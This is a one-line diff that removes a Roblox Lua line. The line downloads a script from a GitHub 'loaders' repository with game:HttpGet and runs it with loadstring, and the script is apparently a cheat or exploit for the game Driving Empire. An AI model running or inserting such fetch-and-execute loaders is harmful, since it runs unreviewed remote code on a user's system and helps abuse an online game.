@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/driving-empire-2-new-limited-spam6-fttipzreoczzpq.lua"))()
